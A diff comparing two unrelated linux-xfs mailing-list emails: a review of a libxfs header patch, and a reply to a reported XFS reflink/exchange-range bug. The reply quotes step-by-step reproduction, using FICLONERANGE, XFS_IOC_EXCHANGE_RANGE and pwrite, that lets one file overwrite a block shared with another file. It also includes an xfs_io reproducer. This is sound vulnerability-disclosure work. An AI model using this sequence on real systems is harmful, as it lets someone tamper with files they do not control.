@@ -1,41 +1,42 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A84EF34D926
-	for <linux-xfs@vger.kernel.org>; Mon,  5 Oct 2026 21:50:13 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 83AE44078C5;
+	Mon,  5 Oct 2026 22:29:31 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1791237015; cv=none; b=Pq7HUf5paVGDiK1rS9hmBwxmrsk1R6LI4Vv966aAWjtnrAtTtuycSnRtnwg1XVFDotnlm8SB8JKigZi26AukpBFWL4giw4620QInEKFCPNZ6GPCMnJTdm72Hc+P2+nuilMBL37+rQBemgdN7McoGht/Lph+HACwvXvMhgXxZ0G4=
+	t=1791239373; cv=none; b=k4cvVXPNHwqEqZkMDa0c40y2UlyKY81YmH1yEdPwrC/Fz2nIn5wIHPN3eWghdIRs4GbsjnaamvB6XuxYrp2ALmDI6vmyrKKde/lauYSp0pG9uE82SmyMv9P5TLJEULtwTEi4MH2ND2Azr/4Nkecf2m/b4bsXUp/nppt52LvamiM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1791237015; c=relaxed/simple;
-	bh=CUuvlZ8cfLg/2wqiZjg4SJ15F9YRyWuxC+oVUvsPZ1Q=;
+	s=arc-20240116; t=1791239373; c=relaxed/simple;
+	bh=5TxqkdZ7AYKxE/nf2CaYT5vYafXJgqZ/dZdxzUPiRQE=;
 	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=HJkw7zNoEoqnAAjcNuISHhKATj+PWem5eTmpIOi/ti08C19DNVsJqSnwbaW6BbzRhKyzYkJHDBb5sbVsXwLTwCwr/9o4VR+lteDX2GKlJTPR5OOLafw8BeNzj7KUmEjU2OeKD98Bq1AfYh/wLLezmvxJ9yHyKO7aGeCPLZrzXAg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=ayl+m97D; arc=none smtp.client-ip=100.103.45.18
+	 Content-Type:Content-Disposition:In-Reply-To; b=JZH+vdYFE5YTNHQEDgVOYC8gp+dj4TtGof3vw8LuGtZlob8EH3qPj2q0gPWNxbV+eLFrnyfEmHQIts8Slb7iLJ+lTQEq20syYnSxCsovxy77t+IGgKe4VpjfxYPEbZWyCfINQUViYS8Ruw8Kb5vMJED+o9a8Jr1zOrmT+uJaOKE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=XQFxCjPo; arc=none smtp.client-ip=100.103.45.18
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="ayl+m97D"
-Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id 4D3351F000FF;
-	Mon,  5 Oct 2026 21:50:13 +0000 (UTC)
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="XQFxCjPo"
+Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id 1A83D1F000FF;
+	Mon,  5 Oct 2026 22:29:31 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1791237013;
-	bh=KiBRXZvYh9kU4U0ZBo55xsb2VnhPPhhFOCmLZULYCJI=;
+	s=k20260515; t=1791239371;
+	bh=o5YZ5H7U0RPa7Q0L+uCzp0QvXCJsTP2uo7AiIkVeujA=;
 	h=Date:From:To:Cc:Subject:References:In-Reply-To;
-	b=ayl+m97Dbz+c2dAu2JFJVp0Y8bZLa6AR+8akV6MMLDx0pO81TRspPe8+Y0qngPw4K
-	 tlmwCmA6C0olEVCnmq3mM8Njycn6XngWKBfcGQbQdnB/HqrTqEkQWFxK4bV4nthNhd
-	 O/uBGxfOjbfxFl4/CYolmEB3A5qLt4Xl6xwxsCDcELSyqUjH99VSHxB/PTBcIiDPmg
-	 YJboUJLREDdLJzPwbmKoQ36GteSwEtcs0LEEljhBnl+i63xig4LF3J6P6tvp7xskG6
-	 GPGFldcKZMiFT+4dvFoB9cF3QBlDIt2RBV170V7TjxGYu9uMyQSPGuU1zxFoPq71aY
-	 j9JKjVOIseFZg==
-Date: Mon, 5 Oct 2026 14:50:12 -0700
+	b=XQFxCjPoOa+Whu+2r5BXTjczqdhwwGQ8Y+aF5BkUxc3Ke36CSAtjXrjDHYAUC66Nq
+	 lsvXIntJshNUJ92gL11eppbQ3BZMaQyKYE2T52pkjor1HguzBALToVQ3OTqyNm3n4t
+	 KX/n1v5OcJlRi2hnJOkQr7HfLE6yPidwaH24C0Y//mWeA39pNV+YK0Aw3i8bzdAr0c
+	 Mq1VmzLGbYhRa+Rp9RNAZ/vuLmtBHRnQwZ2198pss+8PzD0/HVH0XNH4LXIFAvCY+H
+	 N/933+Nd04i/tXjAxCeqaoCiXz5+PCgO8kwpTDaCvn+Ib2DHNVSFrQ1B7WvbgNDk4M
+	 sYBrPm9GOWz6A==
+Date: Mon, 5 Oct 2026 15:29:30 -0700
 From: "Darrick J. Wong" <djwong@kernel.org>
-To: Christoph Hellwig <hch@lst.de>
-Cc: Andrey Albershteyn <aalbersh@kernel.org>,
-	Eric Sandeen <sandeen@redhat.com>, Carlos Maiolino <cem@kernel.org>,
-	linux-xfs@vger.kernel.org
-Subject: Re: [PATCH 13/13] libxfs: use all log item headers from the kernel
-Message-ID: <20261005215012.GS2705364@frogsfrogsfrogs>
-References: <20261005125637.1340355-1-hch@lst.de>
- <20261005125637.1340355-14-hch@lst.de>
+To: Norbert Szetei <norbert@doyensec.com>
+Cc: Carlos Maiolino <cem@kernel.org>, linux-xfs@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: Re: [PATCH] xfs: stop exchanging reflink flags during mapping
+ exchanges
+Message-ID: <20261005222930.GH1615495@frogsfrogsfrogs>
+References: <1E196589-DEBE-40AC-AFEA-D420DAAB067F@doyensec.com>
+ <20261002162659.GY2705364@frogsfrogsfrogs>
+ <84F5989D-B089-4AA7-84F3-FD8DEE5D84E3@doyensec.com>
 Precedence: bulk
 X-Mailing-List: linux-xfs@vger.kernel.org
 List-Id: <linux-xfs.vger.kernel.org>
@@ -44,1016 +45,498 @@ List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-In-Reply-To: <20261005125637.1340355-14-hch@lst.de>
+In-Reply-To: <84F5989D-B089-4AA7-84F3-FD8DEE5D84E3@doyensec.com>
 
-On Mon, Oct 05, 2026 at 02:56:23PM +0200, Christoph Hellwig wrote:
-> Wire up all the xfs_*_item.h headers from the kernel instead of
-> duplicating the definitions.
+On Fri, Oct 02, 2026 at 11:08:57PM +0200, Norbert Szetei wrote:
+> On Oct 2, 2026, at 18:26, Darrick J. Wong <djwong@kernel.org> wrote:
+> > 
+> > On Fri, Oct 02, 2026 at 03:38:22PM +0200, Norbert Szetei wrote:
+> >> When an exchange covers the whole of both files,
+> >> xmi_can_exchange_reflink_flags() moves the reflink inode flag from the
+> >> file that has it to the other one, deciding that from req->blockcount
+> >> against XFS_B_TO_FSB(mp, i_disk_size) on each inode.
+> >> 
+> >> i_disk_size does not bound an inode's mappings, and
+> >> XFS_EXCHMAPS_SET_SIZES creates that state by assigning both i_disk_size
+> >> values from the sizes sampled before the operation without unmapping
+> >> anything above the new size. An exchange over [0, i_disk_size) can
+> >> therefore pass every test in the function while an inode still owns
+> >> shared mappings above EOF, and the post-operation cleanup clears its
+> > 
+> > How do you end up with shared mappings above EOF?  You write a /lot/ of
+> > sentences here but weirdly none of it explains how this key assumption
+> > is violated.
 > 
-> Signed-off-by: Christoph Hellwig <hch@lst.de>
+> Fair. Here it is with physical block numbers, 4k blocks. peer is the file
+> that gets rewritten and file1 is the one that ends up with the flag 
+> cleared.
+> 
+> Start, nothing shared:
+> 
+> 	peer size 4096   -> [100]
+> 	file1 size 12288 -> [200] [201] [202]
+> 	donor1 size 4096 -> [300]
+> 	donor2 size 4096 -> [400]
+> 
+> 1. FICLONERANGE peer's block into file1's middle slot:
+> 
+> 	peer size 4096   -> [100]
+> 	file1 size 12288 -> [200] [100] [202] reflink flag set
+>                             ^^^^^ both files own block 100
+> 
+> 2. XFS_IOC_EXCHANGE_RANGE file1 against donor1, file1_offset 0, 
+> file2_offset 8192, length 0, TO_EOF. One block is exchanged, and the sizes
+> are exchanged with it:
+> 
+> 	file1 size 4096   -> [200] [100] [300] reflink flag set
+>                              ^^^^^^^^^^^ still owned, now past the size
+> 	donor1 size 12288 -> [202]
+> 
+> file1 says it is one block long while it still owns three. Nothing was
+> unmapped. file2_offset is block 2, so this exchange cannot clear a flag.
+> 
+> 3. XFS_IOC_EXCHANGE_RANGE file1 against donor2, both offsets 0, length 4096.
+> By i_disk_size this is two one-block files exchanging everything, so
+> xmi_can_exchange_reflink_flags() agrees and the flag is cleared:
+> 
+> 	file1 size 4096   -> [400] [100] [300] reflink flag CLEARED
+> 	donor2 size 4096  -> [200]
+> 
+> Block 100 is still shared with peer.
+> 
+> 4. pwrite(file1, 4096, 4096), which is file1's second slot, block 100.
+> xfs_is_cow_inode(file1) is false, so no CoW:
+> 
+> 	peer size 4096 -> [100] same block, new contents
+> 
+> Block 100 is the only one that matters here. PoC below, it reads a file 
+> called peer in the current directory. The filesystem needs reflink and 
+> exchange-range, which mkfs.xfs 7.x turns on by default.
 
-Can't wait for the log item code to get ported too, though that's a much
-bigger lift than the declarations.
+So that's the real problem -- exchange-range is exchanging the file
+size numbers even though we didn't actually exchange all the file data.
+Let's say you create a file1 with 12345678 bytes and a file2 with
+1234567 bytes.  Then you ask the kernel to exchange the last 811342
+bytes of file1 with the last 54919 bytes of file2.  You'd expect that
+afterwards, file1 will be 12345678 - 811342 + 54919 = 11589255 bytes,
+and that file2 will be 1234567 - 54919 + 811342 = 1990990 bytes:
 
-Reviewed-by: "Darrick J. Wong" <djwong@kernel.org>
+l1sz=12345678			# file size for file1
+l2sz=1234567			# file size for file2
+
+l1rem=$((l1sz % 1048576))
+l2rem=$((l2sz % 65536))
+
+l1off=$((l1sz - l1rem))		# file1 size rounded down to 1M
+l2off=$((l2sz - l2rem))		# file2 size rounded down to 64k
+
+xfs_io -c "exchangerange -d $l1off -s $l2off -t $rootdir/file2" \
+	$rootdir/file1
+
+Instead you end up with file1 being 1234567 bytes and file2 being
+12345678 bytes, even though we specified nonzero offsets.
+
+If we set the file size incorrectly, we can now have shared blocks
+beyond EOF by accident.  Files by definition do not have written data
+beyond EOF.  Only written blocks can be shared because sharing
+preallocations does not make sense, so therefore there cannot be written
+blocks completely beyond EOF.
+
+Anyway, thank you for sharing a GPL2'd reproducer program, that will go
+into fstests easily for wider testing.
 
 --D
 
-> ---
->  db/logformat.c                           |   4 +
->  include/atomic.h                         |   1 +
->  include/libxfs.h                         |   1 -
->  libxfs/Makefile                          |  10 ++-
->  libxfs/defer_item.c                      |   3 +-
->  libxfs/defer_item.h                      |  56 -------------
->  libxfs/iunlink.c                         |  10 +--
->  libxfs/stubs/xfs_inode.h                 |   8 ++
->  libxfs/trans.c                           |  12 +++
->  libxfs/xfs_alloc.c                       |   2 +-
->  libxfs/xfs_attr.c                        |   2 +-
->  libxfs/xfs_attr_item.h                   |  64 +++++++++++++++
->  libxfs/xfs_bmap.c                        |   2 +-
->  libxfs/xfs_bmap_item.h                   |  78 ++++++++++++++++++
->  libxfs/xfs_exchmaps.c                    |   2 +-
->  libxfs/xfs_exchmaps_item.h               |  64 +++++++++++++++
->  libxfs/xfs_extfree_item.h                | 100 +++++++++++++++++++++++
->  libxfs/xfs_ialloc.c                      |   1 +
->  libxfs/xfs_icreate_item.h                |  22 +++++
->  libxfs/xfs_inode_util.c                  |   3 +-
->  libxfs/{iunlink.h => xfs_iunlink_item.h} |  17 ++--
->  libxfs/xfs_parent.c                      |   2 +-
->  libxfs/xfs_platform.h                    |   1 -
->  libxfs/xfs_refcount.c                    |   2 +-
->  libxfs/xfs_refcount_item.h               |  82 +++++++++++++++++++
->  libxfs/xfs_rmap.c                        |   2 +-
->  libxfs/xfs_rmap_item.h                   |  81 ++++++++++++++++++
->  libxfs/xfs_trans_resv.c                  |   7 +-
->  28 files changed, 551 insertions(+), 88 deletions(-)
->  delete mode 100644 libxfs/defer_item.h
->  create mode 100644 libxfs/xfs_attr_item.h
->  create mode 100644 libxfs/xfs_bmap_item.h
->  create mode 100644 libxfs/xfs_exchmaps_item.h
->  create mode 100644 libxfs/xfs_extfree_item.h
->  create mode 100644 libxfs/xfs_icreate_item.h
->  rename libxfs/{iunlink.h => xfs_iunlink_item.h} (61%)
->  create mode 100644 libxfs/xfs_refcount_item.h
->  create mode 100644 libxfs/xfs_rmap_item.h
 > 
-> diff --git a/db/logformat.c b/db/logformat.c
-> index aba5b0b1b050..5d3d818d5575 100644
-> --- a/db/logformat.c
-> +++ b/db/logformat.c
-> @@ -10,6 +10,10 @@
->  #include "output.h"
->  #include "libxlog.h"
->  #include "logformat.h"
-> +#include "xfs_extfree_item.h"
-> +#include "xfs_bmap_item.h"
-> +#include "xfs_rmap_item.h"
-> +#include "xfs_refcount_item.h"
->  
->  #define MAX_LSUNIT	256 * 1024	/* max log buf. size */
->  
-> diff --git a/include/atomic.h b/include/atomic.h
-> index 3b7eabd0faa7..ee2161fdf9cc 100644
-> --- a/include/atomic.h
-> +++ b/include/atomic.h
-> @@ -18,6 +18,7 @@
->  #include <urcu/uatomic.h>
->  #include "spinlock.h"
->  
-> +typedef	int32_t	refcount_t;
->  typedef	int32_t	atomic_t;
->  typedef	int64_t	atomic64_t;
->  
-> diff --git a/include/libxfs.h b/include/libxfs.h
-> index 549176cf0b2c..e28b79d80143 100644
-> --- a/include/libxfs.h
-> +++ b/include/libxfs.h
-> @@ -105,7 +105,6 @@ struct iomap;
->  #include "xfs_rtbitmap.h"
->  #include "xfs_rtrmap_btree.h"
->  #include "xfs_ag_resv.h"
-> -#include "defer_item.h"
->  
->  #ifndef ARRAY_SIZE
->  #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
-> diff --git a/libxfs/Makefile b/libxfs/Makefile
-> index ac7ddac5acec..df11c119c465 100644
-> --- a/libxfs/Makefile
-> +++ b/libxfs/Makefile
-> @@ -20,12 +20,10 @@ PKGHFILES = xfs_fs.h \
->  	xfs_log_format.h
->  
->  HFILES = \
-> -	defer_item.h \
->  	libxfs_io.h \
->  	libxfs_api_defs.h \
->  	listxattr.h \
->  	init.h \
-> -	iunlink.h \
->  	xfs_platform.h \
->  	linux-err.h \
->  	topology.h \
-> @@ -35,10 +33,12 @@ HFILES = \
->  	xfs_alloc.h \
->  	xfs_alloc_btree.h \
->  	xfs_attr_leaf.h \
-> +	xfs_attr_item.h \
->  	xfs_attr_sf.h \
->  	xfs_bit.h \
->  	xfs_buf_item.h \
->  	xfs_bmap.h \
-> +	xfs_bmap_item.h \
->  	xfs_bmap_btree.h \
->  	xfs_btree.h \
->  	xfs_btree_mem.h \
-> @@ -50,13 +50,17 @@ HFILES = \
->  	xfs_dir2_priv.h \
->  	xfs_errortag.h \
->  	xfs_exchmaps.h \
-> +	xfs_exchmaps_item.h \
-> +	xfs_extfree_item.h \
->  	xfs_group.h \
->  	xfs_ialloc.h \
->  	xfs_ialloc_btree.h \
-> +	xfs_icreate_item.h \
->  	xfs_inode_buf.h \
->  	xfs_inode_fork.h \
->  	xfs_inode_item.h \
->  	xfs_inode_util.h \
-> +	xfs_iunlink_item.h \
->  	xfs_log_recover.h \
->  	xfs_metadir.h \
->  	xfs_metafile.h \
-> @@ -64,9 +68,11 @@ HFILES = \
->  	xfs_quota_defs.h \
->  	xfs_refcount.h \
->  	xfs_refcount_btree.h \
-> +	xfs_refcount_item.h \
->  	xfs_rtrefcount_btree.h \
->  	xfs_rmap.h \
->  	xfs_rmap_btree.h \
-> +	xfs_rmap_item.h \
->  	xfs_rtbitmap.h \
->  	xfs_rtgroup.h \
->  	xfs_rtrmap_btree.h \
-> diff --git a/libxfs/defer_item.c b/libxfs/defer_item.c
-> index fada5b6db2a6..72d79b10d820 100644
-> --- a/libxfs/defer_item.c
-> +++ b/libxfs/defer_item.c
-> @@ -25,12 +25,11 @@
->  #include "xfs_da_btree.h"
->  #include "xfs_attr.h"
->  #include "libxfs.h"
-> -#include "defer_item.h"
->  #include "xfs_ag.h"
->  #include "xfs_exchmaps.h"
-> -#include "defer_item.h"
->  #include "xfs_group.h"
->  #include "xfs_rtgroup.h"
-> +#include "xfs_attr_item.h"
->  
->  /* Dummy defer item ops, since we don't do logging. */
->  
-> diff --git a/libxfs/defer_item.h b/libxfs/defer_item.h
-> deleted file mode 100644
-> index 325a6f7b2dcb..000000000000
-> --- a/libxfs/defer_item.h
-> +++ /dev/null
-> @@ -1,56 +0,0 @@
-> -// SPDX-License-Identifier: GPL-2.0-or-later
-> -/*
-> - * Copyright (c) 2023-2024 Oracle.  All Rights Reserved.
-> - * Author: Darrick J. Wong <djwong@kernel.org>
-> - */
-> -#ifndef	__LIBXFS_DEFER_ITEM_H_
-> -#define	__LIBXFS_DEFER_ITEM_H_
-> -
-> -struct xfs_bmap_intent;
-> -
-> -void xfs_bmap_defer_add(struct xfs_trans *tp, struct xfs_bmap_intent *bi);
-> -
-> -enum xfs_attr_defer_op {
-> -	XFS_ATTR_DEFER_SET,
-> -	XFS_ATTR_DEFER_REMOVE,
-> -	XFS_ATTR_DEFER_REPLACE,
-> -};
-> -
-> -void xfs_attr_defer_add(struct xfs_da_args *args, enum xfs_attr_defer_op op);
-> -
-> -struct xfs_exchmaps_intent;
-> -
-> -void xfs_exchmaps_defer_add(struct xfs_trans *tp,
-> -		struct xfs_exchmaps_intent *xmi);
-> -
-> -struct xfs_extent_free_item;
-> -struct xfs_defer_pending;
-> -
-> -void xfs_extent_free_defer_add(struct xfs_trans *tp,
-> -		struct xfs_extent_free_item *xefi,
-> -		struct xfs_defer_pending **dfpp);
-> -
-> -struct xfs_rmap_intent;
-> -
-> -void xfs_rmap_defer_add(struct xfs_trans *tp, struct xfs_rmap_intent *ri);
-> -
-> -struct xfs_refcount_intent;
-> -
-> -void xfs_refcount_defer_add(struct xfs_trans *tp,
-> -		struct xfs_refcount_intent *ri);
-> -
-> -/* log intent size calculations */
-> -
-> -unsigned int xfs_efi_log_space(unsigned int nr);
-> -unsigned int xfs_efd_log_space(unsigned int nr);
-> -
-> -unsigned int xfs_rui_log_space(unsigned int nr);
-> -unsigned int xfs_rud_log_space(void);
-> -
-> -unsigned int xfs_bui_log_space(unsigned int nr);
-> -unsigned int xfs_bud_log_space(void);
-> -
-> -unsigned int xfs_cui_log_space(unsigned int nr);
-> -unsigned int xfs_cud_log_space(void);
-> -
-> -#endif /* __LIBXFS_DEFER_ITEM_H_ */
-> diff --git a/libxfs/iunlink.c b/libxfs/iunlink.c
-> index 875e0caae988..8008c24a87a5 100644
-> --- a/libxfs/iunlink.c
-> +++ b/libxfs/iunlink.c
-> @@ -17,17 +17,9 @@
->  #include "xfs_inode.h"
->  #include "xfs_trans.h"
->  #include "xfs_ag.h"
-> -#include "iunlink.h"
-> +#include "xfs_iunlink_item.h"
->  #include "xfs_trace.h"
->  
-> -/* in memory log item structure */
-> -struct xfs_iunlink_item {
-> -	struct xfs_inode	*ip;
-> -	struct xfs_perag	*pag;
-> -	xfs_agino_t		next_agino;
-> -	xfs_agino_t		old_agino;
-> -};
-> -
->  /*
->   * Look up the inode cluster buffer and log the on-disk unlinked inode change
->   * we need to make.
-> diff --git a/libxfs/stubs/xfs_inode.h b/libxfs/stubs/xfs_inode.h
-> index 0292beecf903..e6cfdd22c323 100644
-> --- a/libxfs/stubs/xfs_inode.h
-> +++ b/libxfs/stubs/xfs_inode.h
-> @@ -442,4 +442,12 @@ extern void	libxfs_irele(struct xfs_inode *ip);
->  #define xfs_inherit_nosymlinks		(false)
->  #define xfs_inherit_nodefrag		(false)
->  
-> +static inline struct xfs_inode *
-> +xfs_iunlink_lookup(struct xfs_perag *pag, xfs_agino_t agino)
-> +{
-> +	return NULL;
-> +}
-> +int xfs_iunlink_reload_next(struct xfs_trans *tp, struct xfs_buf *agibp,
-> +		xfs_agino_t prev_agino, xfs_agino_t next_agino);
-> +
->  #endif /* __XFS_INODE_H__ */
-> diff --git a/libxfs/trans.c b/libxfs/trans.c
-> index 25015ad2795c..c71c9111187f 100644
-> --- a/libxfs/trans.c
-> +++ b/libxfs/trans.c
-> @@ -1315,3 +1315,15 @@ out_blocks:
->  
->  	return error;
->  }
-> +
-> +void
-> +xfs_icreate_log(
-> +	struct xfs_trans	*tp,
-> +	xfs_agnumber_t		agno,
-> +	xfs_agblock_t		agbno,
-> +	unsigned int		count,
-> +	unsigned int		inode_size,
-> +	xfs_agblock_t		length,
-> +	unsigned int		generation)
-> +{
-> +}
-> diff --git a/libxfs/xfs_alloc.c b/libxfs/xfs_alloc.c
-> index 8feaa0edace1..d99602bcc16f 100644
-> --- a/libxfs/xfs_alloc.c
-> +++ b/libxfs/xfs_alloc.c
-> @@ -27,7 +27,7 @@
->  #include "xfs_ag_resv.h"
->  #include "xfs_bmap.h"
->  #include "xfs_health.h"
-> -#include "defer_item.h"
-> +#include "xfs_extfree_item.h"
->  
->  struct kmem_cache	*xfs_extfree_item_cache;
->  
-> diff --git a/libxfs/xfs_attr.c b/libxfs/xfs_attr.c
-> index 57a0a175c286..aaf1f9f83c20 100644
-> --- a/libxfs/xfs_attr.c
-> +++ b/libxfs/xfs_attr.c
-> @@ -24,7 +24,7 @@
->  #include "xfs_quota.h"
->  #include "xfs_trans_space.h"
->  #include "xfs_trace.h"
-> -#include "defer_item.h"
-> +#include "xfs_attr_item.h"
->  #include "xfs_parent.h"
->  
->  struct kmem_cache		*xfs_attr_intent_cache;
-> diff --git a/libxfs/xfs_attr_item.h b/libxfs/xfs_attr_item.h
-> new file mode 100644
-> index 000000000000..d108a11b55ae
-> --- /dev/null
-> +++ b/libxfs/xfs_attr_item.h
-> @@ -0,0 +1,64 @@
-> +/* SPDX-License-Identifier: GPL-2.0-or-later
-> + *
-> + * Copyright (C) 2022 Oracle.  All Rights Reserved.
-> + * Author: Allison Henderson <allison.henderson@oracle.com>
-> + */
-> +#ifndef	__XFS_ATTR_ITEM_H__
-> +#define	__XFS_ATTR_ITEM_H__
-> +
-> +/* kernel only ATTRI/ATTRD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_zone;
-> +
-> +struct xfs_attri_log_nameval {
-> +	struct kvec		name;
-> +	struct kvec		new_name;	/* PPTR_REPLACE only */
-> +	struct kvec		value;
-> +	struct kvec		new_value;	/* PPTR_REPLACE only */
-> +	refcount_t		refcount;
-> +
-> +	/* name and value follow the end of this struct */
-> +};
-> +
-> +/*
-> + * This is the "attr intention" log item.  It is used to log the fact that some
-> + * extended attribute operations need to be processed.  An operation is
-> + * currently either a set or remove.  Set or remove operations are described by
-> + * the xfs_attr_intent which may be logged to this intent.
-> + *
-> + * During a normal attr operation, name and value point to the name and value
-> + * fields of the caller's xfs_da_args structure.  During a recovery, the name
-> + * and value buffers are copied from the log, and stored in a trailing buffer
-> + * attached to the xfs_attr_intent until they are committed.  They are freed
-> + * when the xfs_attr_intent itself is freed when the work is done.
-> + */
-> +struct xfs_attri_log_item {
-> +	struct xfs_log_item		attri_item;
-> +	atomic_t			attri_refcount;
-> +	struct xfs_attri_log_nameval	*attri_nameval;
-> +	struct xfs_attri_log_format	attri_format;
-> +};
-> +
-> +/*
-> + * This is the "attr done" log item.  It is used to log the fact that some attrs
-> + * earlier mentioned in an attri item have been freed.
-> + */
-> +struct xfs_attrd_log_item {
-> +	struct xfs_log_item		attrd_item;
-> +	struct xfs_attri_log_item	*attrd_attrip;
-> +	struct xfs_attrd_log_format	attrd_format;
-> +};
-> +
-> +extern struct kmem_cache	*xfs_attri_cache;
-> +extern struct kmem_cache	*xfs_attrd_cache;
-> +
-> +enum xfs_attr_defer_op {
-> +	XFS_ATTR_DEFER_SET,
-> +	XFS_ATTR_DEFER_REMOVE,
-> +	XFS_ATTR_DEFER_REPLACE,
-> +};
-> +
-> +void xfs_attr_defer_add(struct xfs_da_args *args, enum xfs_attr_defer_op op);
-> +
-> +#endif	/* __XFS_ATTR_ITEM_H__ */
-> diff --git a/libxfs/xfs_bmap.c b/libxfs/xfs_bmap.c
-> index 18308d65f92d..148d036bab67 100644
-> --- a/libxfs/xfs_bmap.c
-> +++ b/libxfs/xfs_bmap.c
-> @@ -33,7 +33,7 @@
->  #include "xfs_ag_resv.h"
->  #include "xfs_refcount.h"
->  #include "xfs_health.h"
-> -#include "defer_item.h"
-> +#include "xfs_bmap_item.h"
->  #include "xfs_symlink_remote.h"
->  #include "xfs_inode_util.h"
->  #include "xfs_rtgroup.h"
-> diff --git a/libxfs/xfs_bmap_item.h b/libxfs/xfs_bmap_item.h
-> new file mode 100644
-> index 000000000000..b42fee06899d
-> --- /dev/null
-> +++ b/libxfs/xfs_bmap_item.h
-> @@ -0,0 +1,78 @@
-> +// SPDX-License-Identifier: GPL-2.0+
-> +/*
-> + * Copyright (C) 2016 Oracle.  All Rights Reserved.
-> + * Author: Darrick J. Wong <darrick.wong@oracle.com>
-> + */
-> +#ifndef	__XFS_BMAP_ITEM_H__
-> +#define	__XFS_BMAP_ITEM_H__
-> +
-> +/*
-> + * There are (currently) two pairs of bmap btree redo item types: map & unmap.
-> + * The common abbreviations for these are BUI (bmap update intent) and BUD
-> + * (bmap update done).  The redo item type is encoded in the flags field of
-> + * each xfs_map_extent.
-> + *
-> + * *I items should be recorded in the *first* of a series of rolled
-> + * transactions, and the *D items should be recorded in the same transaction
-> + * that records the associated bmbt updates.
-> + *
-> + * Should the system crash after the commit of the first transaction but
-> + * before the commit of the final transaction in a series, log recovery will
-> + * use the redo information recorded by the intent items to replay the
-> + * bmbt metadata updates in the non-first transaction.
-> + */
-> +
-> +/* kernel only BUI/BUD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_cache;
-> +
-> +/*
-> + * Max number of extents in fast allocation path.
-> + */
-> +#define	XFS_BUI_MAX_FAST_EXTENTS	1
-> +
-> +/*
-> + * This is the "bmap update intent" log item.  It is used to log the fact that
-> + * some reverse mappings need to change.  It is used in conjunction with the
-> + * "bmap update done" log item described below.
-> + *
-> + * These log items follow the same rules as struct xfs_efi_log_item; see the
-> + * comments about that structure (in xfs_extfree_item.h) for more details.
-> + */
-> +struct xfs_bui_log_item {
-> +	struct xfs_log_item		bui_item;
-> +	atomic_t			bui_refcount;
-> +	atomic_t			bui_next_extent;
-> +	struct xfs_bui_log_format	bui_format;
-> +};
-> +
-> +static inline size_t
-> +xfs_bui_log_item_sizeof(
-> +	unsigned int		nr)
-> +{
-> +	return offsetof(struct xfs_bui_log_item, bui_format) +
-> +			xfs_bui_log_format_sizeof(nr);
-> +}
-> +
-> +/*
-> + * This is the "bmap update done" log item.  It is used to log the fact that
-> + * some bmbt updates mentioned in an earlier bui item have been performed.
-> + */
-> +struct xfs_bud_log_item {
-> +	struct xfs_log_item		bud_item;
-> +	struct xfs_bui_log_item		*bud_buip;
-> +	struct xfs_bud_log_format	bud_format;
-> +};
-> +
-> +extern struct kmem_cache	*xfs_bui_cache;
-> +extern struct kmem_cache	*xfs_bud_cache;
-> +
-> +struct xfs_bmap_intent;
-> +
-> +void xfs_bmap_defer_add(struct xfs_trans *tp, struct xfs_bmap_intent *bi);
-> +
-> +unsigned int xfs_bui_log_space(unsigned int nr);
-> +unsigned int xfs_bud_log_space(void);
-> +
-> +#endif	/* __XFS_BMAP_ITEM_H__ */
-> diff --git a/libxfs/xfs_exchmaps.c b/libxfs/xfs_exchmaps.c
-> index 7d6f949aa1f3..114463c101d6 100644
-> --- a/libxfs/xfs_exchmaps.c
-> +++ b/libxfs/xfs_exchmaps.c
-> @@ -22,7 +22,7 @@
->  #include "xfs_error.h"
->  #include "xfs_errortag.h"
->  #include "xfs_health.h"
-> -#include "defer_item.h"
-> +#include "xfs_exchmaps_item.h"
->  #include "xfs_da_format.h"
->  #include "xfs_da_btree.h"
->  #include "xfs_attr_leaf.h"
-> diff --git a/libxfs/xfs_exchmaps_item.h b/libxfs/xfs_exchmaps_item.h
-> new file mode 100644
-> index 000000000000..efa368d25d09
-> --- /dev/null
-> +++ b/libxfs/xfs_exchmaps_item.h
-> @@ -0,0 +1,64 @@
-> +/* SPDX-License-Identifier: GPL-2.0-or-later */
-> +/*
-> + * Copyright (c) 2020-2024 Oracle.  All Rights Reserved.
-> + * Author: Darrick J. Wong <djwong@kernel.org>
-> + */
-> +#ifndef	__XFS_EXCHMAPS_ITEM_H__
-> +#define	__XFS_EXCHMAPS_ITEM_H__
-> +
-> +/*
-> + * The file mapping exchange intent item helps us exchange multiple file
-> + * mappings between two inode forks.  It does this by tracking the range of
-> + * file block offsets that still need to be exchanged, and relogs as progress
-> + * happens.
-> + *
-> + * *I items should be recorded in the *first* of a series of rolled
-> + * transactions, and the *D items should be recorded in the same transaction
-> + * that records the associated bmbt updates.
-> + *
-> + * Should the system crash after the commit of the first transaction but
-> + * before the commit of the final transaction in a series, log recovery will
-> + * use the redo information recorded by the intent items to replay the
